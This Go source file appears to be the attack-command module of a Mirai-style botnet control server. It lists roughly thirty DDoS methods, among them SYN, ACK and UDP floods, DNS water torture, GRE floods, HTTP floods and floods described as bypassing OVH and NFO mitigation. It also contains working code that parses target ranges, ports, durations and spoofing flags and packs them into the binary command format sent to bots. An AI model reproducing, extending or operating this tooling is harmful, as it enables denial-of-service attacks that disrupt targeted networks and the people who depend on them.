package main

import (
	"fmt"
	"strings"
	"strconv"
	"net"
	"encoding/binary"
	"errors"
)

type AttackInfo struct {
	attackID            uint8
	attackFlags         []uint8
	attackDescription   string
}

type Attack struct {
	Duration    uint32
	Type        uint8
	Targets     map[uint32]uint8    // Prefix/netmask
	Flags       map[uint8]string    // key=value
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"len": FlagInfo{
		0,
		"Size of packet data, default is 512 bytes",
	},
	"rand": FlagInfo{
		1,
		"Randomize packet data content, default is 1 (yes)",
	},
	"tos": FlagInfo{
		2,
		"TOS field value in IP header, default is 0",
	},
	"ident": FlagInfo{
		3,
		"ID field value in IP header, default is random",
	},
	"ttl": FlagInfo{
		4,
		"TTL field in IP header, default is 255",
	},
	"df": FlagInfo{
		5,
		"Set the Dont-Fragment bit in IP header, default is 0 (no)",
	},
	"sport": FlagInfo{
		6,
		"Source port, default is random",
	},
	"dport": FlagInfo{
		7,
		"Destination port, default is random",
	},
	"domain": FlagInfo{
		8,
		"Domain name to attack",
	},
	"dhid": FlagInfo{
		9,
		"Domain name transaction ID, default is random",
	},
	"urg": FlagInfo{
		11,
		"Set the URG bit in IP header, default is 0 (no)",
	},
	"ack": FlagInfo{
		12,
		"Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
	},
	"psh": FlagInfo{
		13,
		"Set the PSH bit in IP header, default is 0 (no)",
	},
	"rst": FlagInfo{
		14,
		"Set the RST bit in IP header, default is 0 (no)",
	},
	"syn": FlagInfo{
		15,
		"Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
	},
	"fin": FlagInfo{
		16,
		"Set the FIN bit in IP header, default is 0 (no)",
	},
	"seqnum": FlagInfo{
		17,
		"Sequence number value in TCP header, default is random",
	},
	"acknum": FlagInfo{
		18,
		"Ack number value in TCP header, default is random",
	},
	"gcip": FlagInfo{
		19,
		"Set internal IP to destination ip, default is 0 (no)",
	},
	"method": FlagInfo{
		20,
		"HTTP method name, default is get",
	},
	"postdata": FlagInfo{
		21,
		"POST data, default is empty/none",
	},
	"path": FlagInfo{
		22,
		"HTTP path, default is /",
	},
	"conns": FlagInfo{
		24,
		"Number of connections",
	},
	"source": FlagInfo{
		25,
		"Source IP address, 255.255.255.255 for random",
	},
	"minlen": FlagInfo{
		26,
		"min len",
	},
	"maxlen": FlagInfo{
		27,
		"max len",
	},
	"payload": FlagInfo{
		28,
		"custom payload",
	},
	"repeat": FlagInfo{
		29,
		"number of times to repeat",
	},
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"udp": AttackInfo{
		0,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"udp flood with more options",
	},
	"vse": AttackInfo{
		1,
		[]uint8{2, 3, 4, 5, 6, 7},
		"valve game server based flood",
	},
	"dns": AttackInfo{
		2,
		[]uint8{2, 3, 4, 5, 6, 7, 8, 9},
		"dns water torture",
	},
	"stomp": AttackInfo{
		3,
		[]uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
		"stomp/handshake flood to bypass mitigation devices",
	},
	"udpplain": AttackInfo{
		4,
		[]uint8{0, 1, 7},
		"UDP Flooding, DGRAM UDP with less PPS Speed",
	},
	"std": AttackInfo{
		5,
		[]uint8{0, 1, 7},
		"std flood (uid1 supported)",
	},
	"tcp": AttackInfo{
		6,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"TCP flood (urg,ack,syn)",
	},
	"ack": AttackInfo{
		7,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"ACK flood optimized for higher GBPS",
	},
	"syn": AttackInfo{
		8,
		[]uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"SYN flood optimized for higher GBPS",
	},
	"hex": AttackInfo{
		9,
		[]uint8{0, 1, 7},
		"HEX flood",
	},
	"stdhex": AttackInfo{
		10,
		[]uint8{0, 6, 7},
		"STDHEX flood",
	},
	"nudp": AttackInfo{
		11,
		[]uint8{0, 6, 7},
		"NUDP flood",
	},
	"udphex": AttackInfo{
		12,
		[]uint8{8, 7, 20, 21, 22, 24},
		"UDPHEX flood",
	},
	"xmas": AttackInfo{
		13,
		[]uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
		"XMAS RTCP Flag Flood",
	},
	"tcpbypass": AttackInfo{
		14,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"strong tcp bypass",
	},
	"raw": AttackInfo{
		15,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 29},
		"raw udp flood",
	},
	"cudp": AttackInfo{
		16,
		[]uint8{0, 1, 7, 26, 27, 28, 29},
		"udp flood with custom payload",
	},
	"ovhdrop": AttackInfo{
		17,
		[]uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
		"Drop ovh server",
	},
	"nfo": AttackInfo{
		18,
		[]uint8{0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16},
		"nfo-bypass",
	},
	"ovhudp": AttackInfo{
		19,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"OVH UDP Flood",
	},
	"greip": AttackInfo{
		20,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		"greip flood",
	},
	"greeth": AttackInfo{
		21,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
		"greeth flood",
	},
	"icee": AttackInfo{
		22,
		[]uint8{0, 1, 7},
		"ip Placket Flood",
	},
	"tcpall": AttackInfo{
		23,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"All TCP Flags Mixed Flood",
	},
	"tcpfrag": AttackInfo{
		24,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"TCP FRAG Packet Flood",
	},
	"asyn": AttackInfo{
		25,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"ovh flood",
	},
	"usyn": AttackInfo{
		26,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"USYN TCP Placket Flood",
	},
	"randhex": AttackInfo{
		27,
		[]uint8{0, 1, 7},
		"randhex Flood",
	},
	"ackerpps": AttackInfo{
		28,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"ACK flood optimized for higher pps by SPECTATE",
	},
	"http": AttackInfo{
		12,
		[]uint8{7, 20, 21, 22, 24},
		"HTTP Layer 7 flood",
	},
	"browser": AttackInfo{
		12,
		[]uint8{7, 20, 21, 22, 24},
		"Browser Layer 7 flood",
	},
	"flood": AttackInfo{
		12,
		[]uint8{7, 20, 21, 22, 24},
		"Generic Layer 7 flood",
	},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args := strings.Fields(str) // Ersetzt shellwords.Parse mit einfachem Split

	var atkInfo AttackInfo
	// Parse attack name
	if len(args) == 0 {
		return nil, errors.New("\x1b[38;5;231mMust specify an attack name")
	} else {
		if args[0] == "?" {
			validCmdList := "\x1b[38;5;231mAvailable methods:\r\n"
			for cmdName, atkInfo := range attackInfoLookup {
				validCmdList += "\x1b[38;5;196m" + cmdName + "\x1b[38;5;231m: " + atkInfo.attackDescription + "\r\n"
			}
			return nil, errors.New(validCmdList)
		}
		cmdName := strings.ToLower(args[0])
		if cmdName == "upd" {
			cmdName = "udp"
		}
		var exists bool
		atkInfo, exists = attackInfoLookup[cmdName]
		if !exists {
			return nil, errors.New(fmt.Sprintf("\x1b[38;5;196m%s \x1b[38;5;231mis not a valid command!", args[0]))
		}
		atk.Type = atkInfo.attackID
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("\x1b[38;5;231mMust specify prefix/netmask as targets")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\x1b[38;5;231mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
		cidrArgs := strings.Split(args[0], ",")
		if len(cidrArgs) > 255 {
			return nil, errors.New("\x1b[38;5;231mCannot specify more than 255 targets in a single attack!")
		}
		for _, cidr := range cidrArgs {
			prefix := ""
			netmask := uint8(32)
			cidrInfo := strings.Split(cidr, "/")
			if len(cidrInfo) == 0 {
				return nil, errors.New("\x1b[38;5;231mBlank target specified!")
			}
			prefix = cidrInfo[0]
			if len(cidrInfo) == 2 {
				netmaskTmp, err := strconv.Atoi(cidrInfo[1])
				if err != nil || netmaskTmp > 32 || netmaskTmp < 0 {
					return nil, errors.New(fmt.Sprintf("\x1b[38;5;231mInvalid netmask was supplied, near %s", cidr))
				}
				netmask = uint8(netmaskTmp)
			} else if len(cidrInfo) > 2 {
				return nil, errors.New(fmt.Sprintf("\x1b[38;5;231mToo many /'s in prefix, near %s", cidr))
			}

			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, errors.New(fmt.Sprintf("\x1b[38;5;231mFailed to parse IP address, near %s", cidr))
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
		args = args[1:]
	}

	// Handle [PORT] [TIME] or just [TIME]
	if len(args) == 0 {
		return nil, errors.New("\x1b[38;5;231mMust specify an attack duration")
	}

	// Wenn wir noch 2 oder mehr Argumente haben, könnte das erste ein Port sein
	if len(args) >= 2 {
		// Prüfen ob das erste Argument KEIN flag ist (kein =)
		if !strings.Contains(args[0], "=") {
			port, err := strconv.Atoi(args[0])
			if err == nil && port >= 0 && port <= 65535 {
				// Es ist ein gültiger Port!
				atk.Flags[7] = args[0] // 7 ist dport
				args = args[1:]
			}
		}
	}

	// Jetzt das nächste Argument als Duration parsen
	if len(args) == 0 {
		return nil, errors.New("\x1b[38;5;231mMust specify an attack duration")
	}
	duration, err := strconv.Atoi(args[0])
	if err != nil || duration == 0 || duration > 21600 {
		return nil, errors.New(fmt.Sprintf("\x1b[38;5;231mInvalid attack duration, near %s. Duration must be between 0 and 21600 seconds", args[0]))
	}
	atk.Duration = uint32(duration)
	args = args[1:]

	// Parse flags
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\x1b[38;5;231mValid flags for this method:\r\n\r\n"
			for _, flagID := range atkInfo.attackFlags {
				for flagName, flagInfo := range flagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += "\x1b[38;5;196m" + flagName + "\x1b[38;5;231m: " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("\x1b[38;5;196mInvalid flag! \x1b[38;5;231mUse key=value format near %s", args[0]))
		}
		flagInfo, exists := flagInfoLookup[flagSplit[0]]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("\x1b[38;5;196mInvalid flag key %s, near %s", flagSplit[0], args[0]))
		}
		atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, errors.New("\x1b[38;5;231mCannot have more than 255 flags")
	}

	return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte

	// Add in attack duration
	tmp = make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)

	// Add in attack type
	buf = append(buf, byte(this.Type))

	// Send number of targets
	buf = append(buf, byte(len(this.Targets)))

	// Send targets
	for prefix, netmask := range this.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, prefix)
		tmp[4] = byte(netmask)
		buf = append(buf, tmp...)
	}

	// Send number of flags
	buf = append(buf, byte(len(this.Flags)))

	// Send flags
	for key, val := range this.Flags {
		tmp = make([]byte, 2)
		tmp[0] = key
		strbuf := []byte(val)
		if len(strbuf) > 255 {
			return nil, errors.New("\033[01;37mFlag value cannot be more than 255 bytes!")
		}
		tmp[1] = uint8(len(strbuf))
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}

	// Specify the total length
	if len(buf) > 4096 {
		return nil, errors.New("\033[01;37mMax buffer is 4096")
	}
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)

	return buf, nil
}
